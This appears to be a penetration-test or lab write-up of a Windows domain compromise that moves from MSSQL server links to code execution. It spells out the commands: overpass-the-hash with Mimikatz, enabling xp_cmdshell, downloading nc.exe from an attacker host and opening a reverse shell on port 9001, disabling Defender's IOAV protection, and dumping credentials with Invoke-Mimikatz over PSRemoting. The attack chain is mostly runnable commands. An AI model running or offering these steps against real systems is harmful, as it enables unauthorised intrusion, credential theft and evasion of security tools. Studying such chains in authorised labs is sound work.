## Step to compromise
Enumerating the domain, we can see there is MSSQL instance running and a serviceprincipalname set 
for devsqladmin, we successfully kerberoasted the user, but failed to crack the hash. Running 
PowerUpSQL2 will allow us to enumerate the MSSQL Instance further. Running the following command 
will give us information about the SQL Instance:
```
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```
Still using PowerUpSQL we look to see if there are any database links which will allow us to execute 
stored procedures.
```
Get-SQLServerLink -Instance [instance] -Verbose
Get-SQLServerLinkCrawl -Instance [instance] -Verbose
```
We can see in the verbose output that although we successfully connected to the Instance as ap 
the IsSysAdmin:0 means that we will not be allowed to enable xp_cmdshell. Luckily during enumeration 
of our USER machine, we acquired the NTLM hash of reportuser. Using Over pass the hash method we 
can get a powershell prompt in the context of reportuser.
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:reportuser 
/domain:[domain] /ntlm:[hash] 
/run:powershell.exe"'
```
We re-run our PowerUpSQL commands, and can see that reportuser has IsSysAdmin:1, allowing us to 
enable xp_cmdshell and successfully get a reverse shell
```
Get-SQLServerLinkCrawl -Instance [instance] -verbose
```
Now we can try running Queries to get code execution, we test with running whoami and can see that 
we are running as user\admin.
```
Get-SQLServerLinkCrawl -Instance [instance] -Query 
'exec master..xp_cmdshell "whoami"'
```
Now let’s try to upload nc.exe to the C:\Windows\Temp folder and execute it to give us a reverse shell 
as devsqladmin
```
Get-SQLServerLinkCrawl -Instance [instance] -Query 
'exec master..xp_cmdshell "powershell iex (New-Object 
Net.WebClient).DownloadFile(''http://[ip]/nc.exe'',''C:\Windows\Temp\
nc.exe'')"'
```
After nc.exe is successfully uploaded we can run the following command to execute it and send us 
reverse shell on port 9001 and running cmd.exe
```
Get-SQLServerLinkCrawl -Instance [instance] -Query 
'exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd [ip] 9001"'
```
Using the USER machine, we listen on port 9001 and successfully get a shell as user\devsqladmin
```
nc.exe -lnvp 9001
```
Enumerating DEVSRV shows us that devsqladmin is a local administrator. We add the AD user to 
the Local Administrators and Remote Desktop Users group, so that we can use PSRemoting to execute 
locally loaded functions such as Invoke-Mimikatz on the remote machine. To do this we first 
DisableIOAVProtection so that we can easily run Mimikatz.
```
$sess = New-PSSession -ComputerName [computername]
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection 
$true} -Session $sess
```
Now we can locally load the function Invoke-Mimikatz
```
Import-Module .\Invoke-Mimikatz.ps1
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
